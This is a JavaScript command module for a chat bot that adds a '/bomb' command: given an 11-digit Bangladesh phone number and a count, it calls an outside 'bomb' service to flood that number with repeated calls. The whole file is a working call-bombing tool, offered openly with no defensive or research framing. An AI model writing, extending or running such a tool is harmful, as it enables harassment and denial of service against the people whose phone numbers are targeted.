import axios from 'axios';

const config = {
    name: "bomb",
    description: "Send calls via bomb API",
    usage: "/bomb <phone> <count>",
    cooldown: 3,
    permissions: [2], // Only users with permission 2 can use this command
    credits: "LIKHON AHMED"
};

export async function onCall({ message, userPermissions, args }) {
    // Check if user has permission
    if (!userPermissions.includes(2)) return message.reply("You don't have permission to use this command.");

    // Check arguments
    if (!args || args.length < 2) return message.reply("Usage: /bomb <phone> <count>");

    const phone = args[0].replace(/[^0-9]/g, ''); // Keep only numbers
    const count = parseInt(args[1]);

    if (!/^\d{11}$/.test(phone)) return message.reply("Invalid phone number. Must be 11 digits (Bangladesh format).");
    if (isNaN(count) || count < 1) return message.reply("Invalid count. Must be a number greater than 0.");

    const url = `https://bomb-server-gyhr.onrender.com/call-api?phone=${phone}&count=${count}`;

    try {
        const res = await axios.get(url);
        message.reply(`API Response: ${JSON.stringify(res.data)}`);
    } catch (err) {
        message.reply(`Error calling API: ${err.message}`);
    }
}

export default {
    config,
    onCall
};
